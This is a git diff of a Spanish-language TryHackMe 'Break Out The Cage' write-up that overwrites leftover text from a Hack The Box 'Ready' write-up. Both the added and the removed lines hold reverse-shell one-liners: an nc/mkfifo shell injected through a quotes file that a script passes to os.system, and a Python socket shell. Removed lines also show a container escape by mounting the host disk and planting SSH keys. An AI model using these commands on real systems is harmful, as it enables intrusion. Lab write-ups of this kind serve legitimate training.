@@ -5,9 +5,9 @@ excerpt: "Let's find out what his agent is up to...."
 date: 2022-04-18
 classes: wide
 header:
-  teaser: /assets/images/htb-writeup-ready/ready_logo.png
+  teaser: /assets/images/thm-writeup-break-out-the-cage/cage_logo.png
   teaser_home_page: true
-  icon: /assets/images/hackthebox.webp
+  icon: 
 categories:
   - TryHackMe
   - infosec
@@ -287,15 +287,30 @@ I mean it, honey, the world is being Fed-exed to hell in a hand cart. — The Ro
 
 - Ejecutamos ***linpeas*** y encontramo los siguientes archivos que pueden ser modificados
 
- ![](/assets/images/thm-writeup-break-out-the-cage/cage_vigenere.png)
+ ![](/assets/images/thm-writeup-break-out-the-cage/cage_linpeas.png)
 
 /opt/.dads_scripts/.files
 /opt/.dads_scripts/.files/.quotes
 
+- Revisamos el script ***spread_the_quotes.py*** y observamos que es de solo lectura, pero toma los datos desl archivo ***.quotes***, el cual como vimos arriba si nos permite modificarlo.
 
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+weston@national-treasure:/opt/.dads_scripts$ cat spread_the_quotes.py 
+#!/usr/bin/env python
 
-weston@national-treasure:/opt/.dads_scripts/.files$ echo "Test; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.216 4444 >/tmp/f" > .quotes
+#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
+import os
+import random
+
+lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
+quote = random.choice(lines)
+os.system("wall " + quote)
+
+weston@national-treasure:/opt/.dads_scripts$ 
+```
+
+
+weston@national-treasure:/opt/.dads_scripts/.files$ echo "Nicolas; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.216 4444 >/tmp/f" > .quotes
 
 
 ## Bandera de usuario
@@ -316,79 +331,57 @@ cat Super_Duper_Checklist
 ```
 
 
-
-
-
-
-
-
-
-
 ## Privesc
 
-By running [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) we find a backup file with some SMTP credentials for the gitlab application. 
+- En los correos encontrados, se encuentra el siguiente texto codificado:
 
 ```
-Found /opt/backup/gitlab.rb
-gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
+cage@national-treasure:~/email_backup$ cat email_3
+cat email_3
+From - Cage@nationaltreasure.com
+To - Weston@nationaltreasure.com
+
+Hey Son
+
+Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
+down what it said. Could you look into it please? I think it could be something to do with his
+account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
+sure he's out to get me. The note said:
+
+haiinspsyanileph
+
+The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
+was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
+hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
+ahahahhahaha. Ahhh Face it... he's just odd. 
+
+Regards
+
+hola hijo
+
+Amigo, Sean dejó una nota en su escritorio con una escritura muy extraña. rápidamente escribí
+abajo lo que dijo. ¿Podrías investigarlo por favor? Creo que podría tener algo que ver con él.
+cuenta aquí. Quiero saber qué me está ocultando... Puede que necesite un nuevo agente. Lindo
+Seguro que él está afuera para atraparme. La nota decía:
+
+haiinspsyanileph
+
+El chico también parece obsesionado con mi cara últimamente. Llegó con una máscara de mi cara...
+era bastante extraño. Imagina usar su fea cara... ¡¡No sería capaz de ENFRENTAR eso!!
+hahahahahahahahahahahahahahaahah entiéndelo Weston! ENFRENTAR ESO !!!! jajajajajajajaja
+jajajajajaja Ahhh Acéptalo... es simplemente extraño.
+
+Saludos
 ```
+- Desde cyberchef, procedemos a descifrarla con ***vigenére*** y con la key ***face*** que se repite de manera insistente en el correo y de está manera obtenemos el password de root:
+  
+ ![](/assets/images/thm-writeup-break-out-the-cage/cage_root.png)
 
-That password is the same password as the root password for the container so we can privesc locally inside the container.
+  ![](/assets/images/thm-writeup-break-out-the-cage/cage_root2.png)
 
-```
-git@gitlab:/opt/backup$ su -l root
-su -l root
-Password: wW59U!ZKMbG9+*#h
+  ---
 
-root@gitlab:~# 
-```
+  Eso es todo!
 
-There's a root_pass file in the root of the filesystem but that's not useful.
+  Fuentes:
 
-```
-cat /root_pass
-YG65407Bjqvv9A0a8Tm_7w
-```
-
-If we look at the `/opt/backup/docker-compose.yml` configuration file, we can see it's a hint that we're running in a privileged container:
-
-```
-    volumes:
-      - './srv/gitlab/config:/etc/gitlab'
-      - './srv/gitlab/logs:/var/log/gitlab'
-      - './srv/gitlab/data:/var/opt/gitlab'
-      - './root_pass:/root_pass'
-    privileged: true
-    restart: unless-stopped
-    #mem_limit: 1024m
-```
-
-Privileged containers can access the host's disk devices so we can just read the root flag after mounting the drive.
-
-![](/assets/images/htb-writeup-ready/root.png)
-
-To get a proper shell in the host OS we can drop our SSH keys in the root's .ssh directory.
-
-```
-root@gitlab:~# mount /dev/sda2 /mnt
-mount /dev/sda2 /mnt
-root@gitlab:~# echo 'ssh-rsa AAAAB3NzaC1y[...]+HUBS+l32faXPc= snowscan@kali' > /mnt/root/.ssh/authorized_keys
-
-[...]
-
-$ ssh root@10.129.150.37
-The authenticity of host '10.129.150.37 (10.129.150.37)' can't be established.
-ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.129.150.37' (ECDSA) to the list of known hosts.
-Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)
-
-[...]
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-
-Last login: Thu Feb 11 14:28:18 2021
-root@ready:~# cat root.txt
-b7f98681505cd39066f67147b103c2b3
-```
